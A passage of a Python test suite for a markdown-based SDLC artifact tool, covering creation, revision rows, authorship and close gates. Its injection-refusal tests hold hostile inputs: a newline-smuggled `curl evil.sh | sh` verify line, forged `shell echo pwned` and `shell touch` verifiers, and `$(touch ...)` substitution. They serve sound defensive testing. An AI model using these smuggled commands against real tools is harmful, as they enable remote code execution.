            res = artifact.meta_new(root, "review", "Adversarial code review")
            self.assertTrue(res["id"].startswith("RV-"))
            self.assertTrue(res["indexed"])                  # index bootstrapped on first use
            self.assertTrue(Path(res["path"]).exists())

    def test_review_stamps_raised_by_and_the_rev_row_name_from_author(self) -> None:
        # BG0175: the review scaffold path used to drop --author - no Raised-by line and a
        # literal {{author}} in the revision row. It must now stamp Raised-by and write the
        # resolved name, like every other type.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "reviews").mkdir(parents=True)
            res = artifact.meta_new(root, "review", "Closing review",
                                    {"author": "Darren Benson; human; v1"})
            text = Path(res["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Raised-by:** Darren Benson; human; v1", text)
            self.assertNotIn("{{author}}", text)
            self.assertIn("| Darren Benson | Created via `new` (deterministic) |", text)

    def test_meta_new_takes_allocation_lock(self) -> None:
        # BG0126: meta_new used to allocate + index-append unguarded, so two concurrent
        # retro/review creates could mint the same sequential id and clobber the index.
        # Prove the lock is now entered around the create (fails against the pre-fix code).
        import contextlib
        entered = []
        real_lock = sdlc_md.allocation_lock

        @contextlib.contextmanager
        def _spy(root, *a, **k):
            entered.append(root)
            with real_lock(root, *a, **k):
                yield

        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "retros").mkdir(parents=True)
            orig = sdlc_md.allocation_lock
            sdlc_md.allocation_lock = _spy
            try:
                artifact.meta_new(root, "retro", "Locked retro")
            finally:
                sdlc_md.allocation_lock = orig
        self.assertTrue(entered, "meta_new must take sdlc_md.allocation_lock")

    def test_meta_row_lands_in_the_data_table_not_a_later_one(self) -> None:
        # critic finding: a later link-first table must not attract the new row
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            rd = root / "sdlc-studio" / "retros"; rd.mkdir(parents=True)
            (rd / "_index.md").write_text(
                "# Retro Index\n\n| ID | Sprint | Date | Delivered | Blocked |\n"
                "| --- | --- | --- | --- | --- |\n"
                "| [RETRO-0001](RETRO0001-a.md) | A | d | 1/1 | 0 |\n\n"
                "## Related\n\n| Doc | Note |\n| --- | --- |\n"
                "| [LESSONS](x.md) | summary |\n", encoding="utf-8")
            res = artifact.meta_new(root, "retro", "New retro")
            idx = (rd / "_index.md").read_text(encoding="utf-8").splitlines()
            stem = Path(res["path"]).name          # unique slug, never the bare id
            row_i = next(i for i, l in enumerate(idx) if stem in l)
            related_i = next(i for i, l in enumerate(idx) if l.startswith("## Related"))
            self.assertLess(row_i, related_i)   # inside the data table, not below Related

    def test_cli_new_accepts_retro_type(self) -> None:
        import io
        from contextlib import redirect_stdout
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "retros").mkdir(parents=True)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = artifact.main(["new", "--type", "retro", "--title", "t",
                                    "--root", str(root)])
            self.assertEqual(rc, 0)

    def test_first_retro_bootstraps_index_zero_drift(self) -> None:
        # BG0116: init makes the retros/ dir but no _index.md, so the FIRST retro used to
        # land as a missing-index reconcile drift item. meta_new now bootstraps the index
        # (mirroring the handoff path) so the first retro is indexed, not drift.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "retros").mkdir(parents=True)   # dir only, no index
            self.assertFalse((root / "sdlc-studio" / "retros" / "_index.md").exists())
            res = artifact.meta_new(root, "retro", "First retro")
            self.assertTrue((root / "sdlc-studio" / "retros" / "_index.md").exists())
            self.assertTrue(res["indexed"])
            drift = reconcile.meta_index_drift(root)
            self.assertEqual(drift, [], f"first retro should leave 0 meta drift, got {drift}")

    def test_first_review_bootstraps_index_zero_drift(self) -> None:
        # BG0116: the same bootstrap covers reviews/.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "reviews").mkdir(parents=True)
            res = artifact.meta_new(root, "review", "First review")
            self.assertTrue(res["indexed"])
            self.assertEqual(reconcile.meta_index_drift(root), [])


class RevisionVerbTests(unittest.TestCase):
    """`artifact.py revision`: deterministic batch appends to Revision History -
    the sprint-close mechanical task that used to be hand-scripted."""

    def _repo(self, d):
        repo = Path(d)
        dd = repo / "sdlc-studio" / "change-requests"; dd.mkdir(parents=True)
        for i in (1, 2):
            (dd / f"CR000{i}-thing-{i}.md").write_text(
                f"# CR-000{i}: thing {i}\n\n> **Status:** Proposed\n\n"
                "## Revision History\n\n| Date | Author | Change |\n"
                "| --- | --- | --- |\n| 2026-07-01 | sdlc | Created |\n",
                encoding="utf-8")
        (dd / "CR0003-no-table.md").write_text(
            "# CR-0003: no table\n\n> **Status:** Proposed\n", encoding="utf-8")
        return repo

    def test_batch_appends_one_dated_row_each(self):
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            rc = artifact.main(["revision", "--ids", "CR0001,CR0002",
                                "--note", "Delivered in tranche X",
                                "--author", "close-out", "--root", str(repo)])
            self.assertEqual(rc, 0)
            for slug in ("CR0001-thing-1.md", "CR0002-thing-2.md"):
                text = (repo / "sdlc-studio" / "change-requests" / slug).read_text(
                    encoding="utf-8")
                rows = [ln for ln in text.splitlines()
                        if "Delivered in tranche X" in ln]
                self.assertEqual(len(rows), 1, slug)
                self.assertIn("close-out", rows[0])
                self.assertTrue(rows[0].startswith("| 20"), rows[0])  # dated

    def test_missing_section_refused_loudly(self):
        import contextlib, io
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = artifact.main(["revision", "--ids", "CR0001,CR0003",
                                    "--note", "n", "--root", str(repo)])
            self.assertNotEqual(rc, 0)                    # any refusal -> non-zero
            self.assertIn("CR0003", err.getvalue())       # refused id named
            text = (repo / "sdlc-studio" / "change-requests" /
                    "CR0001-thing-1.md").read_text(encoding="utf-8")
            self.assertIn("| n |", text)                   # the good id still landed

    def test_unknown_id_refused(self):
        import contextlib, io
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = artifact.main(["revision", "--ids", "CR0099",
                                    "--note", "n", "--root", str(repo)])
            self.assertNotEqual(rc, 0)
            self.assertIn("CR0099", err.getvalue())


class CloseUlidTests(unittest.TestCase):
    def test_close_infers_type_from_a_v3_ulid_id(self) -> None:
        # BG0072: the close cascade must type the ids the v3 era mints.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            _v3(repo)
            r = artifact.new(repo, "bug", "ulid close probe", dict(GROOM))
            self.assertTrue(sdlc_md.is_v3_id(r["id"]), r["id"])
            # Since BG0214 the preview runs the real gate ladder, so the bug close needs what a
            # real one needs: a recorded verification depth and a structured triaging seat.
            import transition  # noqa: PLC0415 - local, as the sibling scripts are imported here
            transition.annotate(repo, r["id"], "Verification depth", "functional")
            res = artifact.close(repo, r["id"], dry_run=True,
                                 triaged_by="Tester; agent; v1")
            self.assertEqual(res["type"], "bug")

    def test_close_still_infers_v2_and_dashed_v2_ids(self) -> None:
        for rid, expected in (("BG0007", "bug"), ("CR-0003", "cr"), ("US0001", "story")):
            got = artifact.infer_type_from_id(rid)
            self.assertEqual(got, expected, rid)


import io
from contextlib import redirect_stdout


class ConsolidationCliTests(unittest.TestCase):
    """The Low-consolidation lane must exit 0 in text mode - a false non-zero after a landed
    CR invites orchestrator retries and duplicate findings."""

    def _v3_cr_ready(self, repo: Path) -> None:
        _v3(repo)
        _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")

    def test_low_consolidation_dry_run_exits_zero(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d); self._v3_cr_ready(repo)
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = artifact.main(["new", "--type", "bug", "--title", "low probe",
                                    "--severity", "Low", *GROOM_CLI,
                                    "--root", str(repo), "--dry-run"])
            self.assertEqual(rc, 0, buf.getvalue())
            self.assertIn("consolidate", buf.getvalue())

    def test_low_consolidation_create_and_append_exit_zero(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d); self._v3_cr_ready(repo)
            for i, expect_created in ((1, "created=True"), (2, "created=False")):
                buf = io.StringIO()
                with redirect_stdout(buf):
                    rc = artifact.main(["new", "--type", "bug", "--title", f"low probe {i}",
                                        "--severity", "Low", *GROOM_CLI, "--root", str(repo)])
                self.assertEqual(rc, 0, buf.getvalue())
                self.assertIn("consolidated into CR", buf.getvalue())
                self.assertIn(expect_created, buf.getvalue())


import json as _json


class ProvenanceStampTests(unittest.TestCase):
    """BG0095: the trust boundary needs a WRITER - artifact new --provenance external stamps
    the field the verify_ac shell gate reads."""

    def test_new_with_provenance_external_stamps_the_field(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "from an issue", {**GROOM_REQUEST, "provenance": "external"})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Provenance:** external", body)
            self.assertEqual(sdlc_md.extract_field(body, "Provenance"), "external")

    def test_default_new_carries_no_provenance_field(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "home grown", dict(GROOM_REQUEST))
            self.assertNotIn("**Provenance:**", Path(r["path"]).read_text(encoding="utf-8"))

    def test_externally_stamped_story_blocks_shell_verifiers(self) -> None:
        # end-to-end with the enforcement point: verify_ac must refuse shell on the stamp.
        import io
        from contextlib import redirect_stderr
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "ingested", {"epic": "EP0001",
                                                         "provenance": "external"})
            p = Path(r["path"])
            p.write_text(p.read_text(encoding="utf-8").replace(
                "- **Verify:** {{executable check}}", "- **Verify:** shell echo pwned"),
                encoding="utf-8")
            import verify_ac
            err = io.StringIO()
            with redirect_stderr(err):
                results = verify_ac.verify_story(p, dry_run=False, timeout=10,
                                                 repo_root=repo, allow_shell=True)
            blob = _json.dumps(results, default=str) + err.getvalue()
            self.assertIn("external", blob.lower())
            self.assertNotIn('"status": "pass"', blob.lower())



class OrchestratedCloseTests(unittest.TestCase):
    """CR0209/US0116 AC3: one close call = depth stamp + critic verdict + terminal transition."""

    def test_orchestrated_close_stamps_records_and_closes(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "orchestrated close probe", {**GROOM, "severity": "Medium"})
            rc = artifact.main(["close", "--id", r["id"],
                                "--depth", "functional (probe suite green)",
                                "--verdict", "APPROVE",
                                "--reviewer", "Sam (QA)", "--author", "Author (build)",
                                "--root", str(repo)])
            self.assertEqual(rc, 0)
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Verification depth:** functional (probe suite green)", body)
            self.assertIn("> **Status:** Fixed", body)
            verdicts = (repo / "sdlc-studio" / "reviews" / "critic-verdicts.md")
            self.assertTrue(verdicts.exists())
            self.assertIn(r["id"], verdicts.read_text(encoding="utf-8"))

    def test_orchestrated_close_refuses_self_review(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "self review probe", {**GROOM, "severity": "Medium"})
            rc = artifact.main(["close", "--id", r["id"],
                                "--depth", "functional", "--verdict", "APPROVE",
                                "--reviewer", "Same One", "--author", "Same One",
                                "--root", str(repo)])
            self.assertNotEqual(rc, 0)
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Status:** Open", body)  # nothing transitioned




class RevisionAuthorTests(unittest.TestCase):
    """The Revision History Author cell carries the resolved authorship of record - a name,
    never a hardcoded literal and never the typed triple."""

    @staticmethod
    def _rev_row(body: str) -> str:
        lines = body.splitlines()
        head = next(i for i, ln in enumerate(lines)
                    if ln.strip().startswith("## Revision History"))
        return [ln for ln in lines[head:] if ln.strip().startswith("|")][2]

    def test_named_author_reaches_the_revision_history(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "authored", {**GROOM_REQUEST, "author": "Dani Okafor"})
            self.assertIn("| Dani Okafor |",
                          self._rev_row(Path(r["path"]).read_text(encoding="utf-8")))

    def test_typed_author_triple_renders_the_name_only(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "authored", {**GROOM_REQUEST, "author": "Claude (Fable 5); agent; v5"})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Raised-by:** Claude (Fable 5); agent; v5", body)
            row = self._rev_row(body)
            self.assertIn("| Claude (Fable 5) |", row)
            self.assertNotIn(";", row)

    def test_unattributed_new_names_the_invoking_agent(self) -> None:
        import os
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            prev = os.environ.get("SDLC_AUTHOR")
            os.environ["SDLC_AUTHOR"] = "Sprint Driver; agent; v1"
            try:
                r = artifact.new(repo, "cr", "unattributed", dict(GROOM_REQUEST))
            finally:
                os.environ.pop("SDLC_AUTHOR")
                if prev is not None:
                    os.environ["SDLC_AUTHOR"] = prev
            row = self._rev_row(Path(r["path"]).read_text(encoding="utf-8"))
            self.assertIn("| Sprint Driver |", row)  # not the literal 'sdlc'


RFC_HEADER = "| ID | Title | Priority | Status | Author | Date | Spawned CRs |"


class IndexAuthorColumnTests(unittest.TestCase):
    """The index Author column takes the same resolved NAME as the Revision History row -
    `artifact new` and the finding filer are two creators writing one column."""

    @staticmethod
    def _row(repo: Path) -> str:
        text = (repo / "sdlc-studio" / "rfcs" / "_index.md").read_text(encoding="utf-8")
        return next(ln for ln in text.splitlines() if ln.strip().startswith("| [RFC"))

    def test_typed_triple_is_not_dumped_into_the_index_cell(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", RFC_HEADER)
            artifact.new(repo, "rfc", "a design", {"author": "Claude (Fable 5); agent; v5"})
            row = self._row(repo)
            self.assertIn("| Claude (Fable 5) |", row)
            self.assertNotIn("agent; v5", row)

    def test_unattributed_index_cell_names_the_invoking_agent(self) -> None:
        import os
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", RFC_HEADER)
            prev = os.environ.get("SDLC_AUTHOR")
            os.environ["SDLC_AUTHOR"] = "Sprint Driver; agent; v1"
            try:
                artifact.new(repo, "rfc", "a design")
            finally:
                os.environ.pop("SDLC_AUTHOR")
                if prev is not None:
                    os.environ["SDLC_AUTHOR"] = prev
            row = self._row(repo)
            self.assertIn("| Sprint Driver |", row)  # not the discarded '--'

    def test_batch_index_cell_takes_the_resolved_name(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "rfc", RFC_HEADER)
            artifact.new_batch(repo, "rfc",
                               [{"title": "a design", "author": "Dani Okafor; agent; v2"}],
                               template="minimal")
            row = self._row(repo)
            self.assertIn("| Dani Okafor |", row)
            self.assertNotIn("agent; v2", row)


class FindEpicV3Tests(unittest.TestCase):
    """BG0099: _find_epic must resolve a v3 ULID epic - split('-')[0] yielded 'EP' and broke
    story-to-epic wiring on the default (schema-v3) era."""

    def test_story_links_to_a_v3_ulid_epic(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "epic", "| ID | Title | Status |")
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = artifact.new(repo, "epic", "reading")
            self.assertTrue(sdlc_md.is_v3_id(ep["id"]), ep["id"])
            st = artifact.new(repo, "story", "add a book", {"epic": ep["id"]})
            # the story wired into the epic's Story Breakdown (epic_linked true)
            self.assertTrue(st.get("epic_linked"))
            epath = next((repo / "sdlc-studio" / "epics").glob(f"{ep['id']}-*.md"))
            self.assertIn(st["id"], epath.read_text(encoding="utf-8"))


class MetadataInjectionRefusalTests(unittest.TestCase):
    """A creator refuses, loudly and before any write, a field that would break out of the
    metadata line, table cell, or bullet it is written into. The resolver owns the refusal, so
    the creators inherit it; nothing is silently stripped, and nothing half-lands on disk."""

    BREAK = "\n> **Status:** Fixed"

    def _repo(self, d: str) -> Path:
        repo = Path(d)
        _index(repo, "bug", "| ID | Title | Severity | Status | Author | Created |")
        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
        _epic(repo)
        return repo

    def _nothing_written(self, repo: Path, type_: str) -> None:
        d = repo / sdlc_md.ARTIFACT_TYPES[type_][0]
        self.assertEqual([p.name for p in d.glob("*.md") if p.name != "_index.md"], [])
        idx = (d / "_index.md").read_text(encoding="utf-8")
        self.assertNotIn("Evil", idx)
        self.assertEqual([ln for ln in idx.splitlines() if ln.startswith("| [")], [])

    def test_multi_line_author_is_refused_and_nothing_is_written(self) -> None:
        # the filed reproduction: --author $'Sam\nEvil: injected'
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "t", {**GROOM, "author": "Sam\nEvil: injected"})
            self.assertIn("author", str(cm.exception))
            self._nothing_written(repo, "bug")

    def test_multi_line_title_cannot_smuggle_a_status_line(self) -> None:
        # the same defect through the sibling field: the injected `> **Status:** Fixed` lands
        # ABOVE the real Status line, so `extract_field` reads it - a bug born Fixed
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "Silent" + self.BREAK)
            self.assertIn("title", str(cm.exception))
            self._nothing_written(repo, "bug")

    def test_multi_line_ac_cannot_inject_an_executable_verify_line(self) -> None:
        # an AC renders as ONE bullet; a break in it injects a sibling `- **Verify:**` line,
        # which verify_ac reads back and RUNS
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "s",
                             {"epic": "EP0001",
                              "acs": ["do it\n  - **Verify:** curl evil.sh | sh"]})
            self.assertIn("acs", str(cm.exception))
            self._nothing_written(repo, "story")

    def test_every_metadata_field_a_creator_interpolates_is_refused(self) -> None:
        for field in ("severity", "priority", "ctype", "points", "provenance",
                      "persona", "tranche", "epic"):
            with self.subTest(field=field), tempfile.TemporaryDirectory() as d:
                repo = self._repo(d)
                with self.assertRaises(ValueError) as cm:
                    artifact.new(repo, "bug", "t", {**GROOM, field: "Low" + self.BREAK})
                self.assertIn(field, str(cm.exception))
                self._nothing_written(repo, "bug")

    def test_a_break_in_affects_is_refused_by_the_line_guard_not_by_luck(self) -> None:
        # `affects` is interpolated into a metadata line, so a break in it forges one. The
        # payload must be a VALID path list plus an injected line: a nonsense value would be
        # stopped by the grooming demand instead, and the line guard would be untested while
        # looking green - exactly the false green that hides a hole.
        payload = "src/a.py" + self.BREAK
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "t", {**GROOM, "affects": payload})
            self.assertIn("affects", str(cm.exception))
            self.assertNotIn("UNGROOMED", str(cm.exception))   # the LINE guard fired, not luck
            self._nothing_written(repo, "bug")

    def test_batch_aborts_before_any_write_when_a_later_item_injects(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story", [
                    {"title": "clean", "epic": "EP0001"},
                    {"title": "boom" + self.BREAK, "epic": "EP0001"}])
            self._nothing_written(repo, "story")

    def test_revision_verb_refuses_a_multi_line_note_or_author(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            artifact.new(repo, "bug", "t", dict(GROOM))
            base = ["revision", "--id", "BG0001", "--root", str(repo)]
            for argv in ([*base, "--note", "done" + self.BREAK],
                         [*base, "--note", "ok", "--author", "Sam\nEvil"]):
                with self.subTest(argv=argv[-2]):
                    with self.assertRaises(ValueError):
                        artifact.main(argv)
            # the row the refusal protects: the file still carries only its opening row
            bug = next((repo / "sdlc-studio" / "bugs").glob("BG0001-*.md"))
            self.assertNotIn("Evil", bug.read_text(encoding="utf-8"))

    def test_a_clean_artefact_still_creates(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r = artifact.new(repo, "bug", "a real defect",
                             {**GROOM, "author": "Dani Okafor; agent; v2", "severity": "High"})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("> **Raised-by:** Dani Okafor; agent; v2", body)
            self.assertTrue(r["indexed"])


class LeadingBreakBypassTests(unittest.TestCase):
    """The value that is WRITTEN must be the value that was CHECKED. The front guard once
    stripped before checking, but the persona / acs / options / title writers emit the RAW
    value - so a payload whose only break was LEADING passed the guard (strip discarded it)
    and injected a forged line. A leading break is refused like any other, on `new` AND
    `batch`, and the injected line never reaches disk or the verifier."""

    LEAD = "\n> **Forged-field:** INJECTED"
    RCE_AC = "\n  - **Verify:** shell echo pwned"

    def _repo(self, d: str) -> Path:
        repo = Path(d)
        _index(repo, "story", "| ID | Title | Status | Epic | Created |")
        _index(repo, "bug", "| ID | Title | Severity | Status | Author | Created |")
        _epic(repo)
        return repo

    def _no_story_written(self, repo: Path) -> None:
        d = repo / "sdlc-studio" / "stories"
        self.assertEqual([p.name for p in d.glob("*.md") if p.name != "_index.md"], [])

    def test_leading_break_persona_is_refused_on_new(self) -> None:
        # (a) the reproduced persona forgery: strip discarded the leading break, the raw
        # writer emitted `> **Persona:**` then the forged line
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "victim",
                             {"epic": "EP0001", "persona": self.LEAD})
            self.assertIn("persona", str(cm.exception))
            self._no_story_written(repo)

    def test_leading_break_ac_is_refused_on_new(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "v",
                             {"epic": "EP0001", "acs": [self.RCE_AC]})
            self.assertIn("acs", str(cm.exception))
            self._no_story_written(repo)

    def test_leading_break_option_is_refused_on_new(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            _index(repo, "rfc", "| ID | Title | Status | Date |")
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "rfc", "r", {"options": ["ok", self.LEAD]})
            self.assertIn("options", str(cm.exception))

    def test_leading_break_persona_and_ac_are_refused_on_batch(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story",
                                   [{"title": "v", "epic": "EP0001", "persona": self.LEAD}])
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story",
                                   [{"title": "v", "epic": "EP0001", "acs": [self.RCE_AC]}])
            self._no_story_written(repo)

    def test_leading_break_title_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "\n> **Forged:** x", {"epic": "EP0001"})
            self.assertIn("title", str(cm.exception))
            self._no_story_written(repo)

    def test_refused_ac_never_lets_verify_ac_execute_the_injected_shell(self) -> None:
        # end-to-end: the exact RCE the Summary promotes to must-fix. A refused --ac must
        # leave no story on disk, so verify_ac never sees the injected `shell` verifier and
        # the marker file it would have run is never created.
        import verify_ac
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            marker = repo / "PWNED"
            payload = f"\n  - **Verify:** shell touch {marker}"
            with self.assertRaises(ValueError):
                artifact.new(repo, "story", "v", {"epic": "EP0001", "acs": [payload]})
            self._no_story_written(repo)
            # belt and braces: had a story slipped through, this is what would have run it
            for p in (repo / "sdlc-studio" / "stories").glob("*.md"):
                if p.name != "_index.md":
                    for block in verify_ac.parse_story(p.read_text(encoding="utf-8")):
                        self.assertNotIn("touch", block.verifier or "")
            self.assertFalse(marker.exists(), "injected shell verifier executed - RCE open")


class GroomingDemandTests(unittest.TestCase):
    """BG0136: `artifact new` is a DOCUMENTED create path for a bug and a CR, so it answers to
    the same grooming demand as the finding filer - from the same authority (the planner's own
    `breakdown` predicate). A creator that let an ungroomed unit through would simply be where
    the bug moved to.

    Behaviour only: every assertion here creates (or fails to create) a real artefact and reads
    the result, or asks the PLANNER what it makes of what was written.
    """

    def _bugs(self, repo: Path) -> list[Path]:
        d = repo / "sdlc-studio" / "bugs"
        return [p for p in d.glob("*.md") if p.name != "_index.md"] if d.exists() else []

    def _plan_verdict(self, repo: Path, path: Path, type_: str) -> dict:
        spec = importlib.util.spec_from_file_location(
            "sprint", Path(__file__).resolve().parent.parent / "sprint.py")
        sprint = importlib.util.module_from_spec(spec)
        sys.modules["sprint"] = sprint
        spec.loader.exec_module(sprint)
        return sprint.breakdown(repo, [{"id": path.stem.split("-")[0], "type": type_,
                                        "path": str(path)}], skip_personas=True)

    def test_new_bug_without_grooming_is_refused_and_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "bug", "the parser drops a dash", {"severity": "High"})
            self.assertIn("--affects", str(cm.exception))
            self.assertEqual(self._bugs(repo), [])

    def test_batch_aborts_wholly_on_one_ungroomed_item(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            with self.assertRaises(ValueError) as cm:
                artifact.new_batch(repo, "bug", [
                    {"title": "groomed", **GROOM},
                    {"title": "ungroomed", "severity": "High"},   # item 2 sinks the batch
                ])
            self.assertIn("item 2", str(cm.exception))
            self.assertEqual(self._bugs(repo), [], "a partial batch reached disk")

    def test_a_created_bug_is_plannable(self) -> None:
        # The round trip through the OTHER creator: created here, and the planner accepts it.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect",
                             {"severity": "High", "affects": "src/a.py, src/b.py",
                              "points": 5})
            path = Path(r["path"])
            self.assertEqual(sdlc_md.affects_files(path.read_text(encoding="utf-8")),
                             ["src/a.py", "src/b.py"])
            self.assertEqual(self._plan_verdict(repo, path, "bug")["ungroomed"], [])

    def test_a_created_cr_is_plannable_on_every_template(self) -> None:
        # The full template grafts a rich body over the same head. A CR whose size the planner
        # cannot read back is unsized however the body was rendered.
        for template in ("minimal", "planning", "full"):
            with self.subTest(template=template), tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "cr",
                       "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
                r = artifact.new(repo, "cr", "tighten the gate",
                                 {"priority": "High", "ctype": "Improvement", "impact": "i",
                                  "affects": "src/gate.py", "size": "L",
                                  "template": template})
                path = Path(r["path"])
                self.assertEqual(self._plan_verdict(repo, path, "cr")["ungroomed"], [],
                                 f"{template}: the planner refuses a CR this creator wrote")


# --- US0306: the sweep (L-0154 - a defect found in one writer is swept across its siblings) ---

#: The payload, shaped exactly as `test_file_finding` shapes it: commands in the prose, a
#: `$(...)`, a trailing backslash, and a sentinel path inside the test's own temp tree (never the
#: working tree - L-0158). Free of bare `snake_case` and of any `**Field:**` line, so the
#: markdown-safety pass is the identity and "character for character" means exactly that.
STEPS_PAYLOAD = (
    "1. Stage a change, then run `git commit -a` against the live tree.\n"
    "2. Read the head back with `$(git rev-parse HEAD)`.\n"
    "3. Break the command over a line with a trailing backslash \\\n"
    "4. And here is the one that proves it: `$(touch {sentinel})`\n"
)
#: The sentinel command is BACKTICKED so the temp path inside it sits in a code span:
#: the filer's markdown-safety pass rewrites bare `snake_case` outside code spans, and a
#: temp directory whose random name happens to hold an underscore would otherwise make
#: this fidelity assertion pass or fail by luck of the draw.


def _git_repo(repo: Path) -> None:
    import gitutil
    gitutil.git(["init", "-q", "-b", "main"], repo)
    (repo / "seed.txt").write_text("seed\n", encoding="utf-8")
    gitutil.git(["add", "seed.txt"], repo)
    gitutil.git(["commit", "-qm", "seed"], repo)
    (repo / "staged.txt").write_text("staged\n", encoding="utf-8")
    gitutil.git(["add", "staged.txt"], repo)


def _git_state(repo: Path) -> tuple[str, bytes]:
    import gitutil
    head = gitutil.git(["rev-parse", "HEAD"], repo).stdout.decode()
    return head, (repo / ".git" / "index").read_bytes()


class ArtifactJsonInputTests(unittest.TestCase):
    """US0306 AC1: `artifact new` accepts the same non-shell input path with the same fidelity
    as `file_finding file`. It is the writer the skill's own guidance pushes agents towards, so
    fixing one and not the other would leave the likelier caller carrying the defect."""

    def _spec(self, repo: Path, payload: str) -> Path:
        import json
        p = repo / "finding.json"
        p.write_text(json.dumps({
            "title": "creating executes the steps it is given",
            "severity": "High", "summary": f"see the steps: {payload}",
            "steps": payload, "fix": "read the fields from a file",
            "affects": "src/thing.py", "points": 3}), encoding="utf-8")
        return p

    def _created(self, repo: Path) -> Path:
        return next(p for p in (repo / "sdlc-studio" / "bugs").glob("*.md")
                    if p.name != "_index.md")

    def test_a_bug_created_from_json_reads_back_character_for_character(self) -> None:
        import contextlib
        import io
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
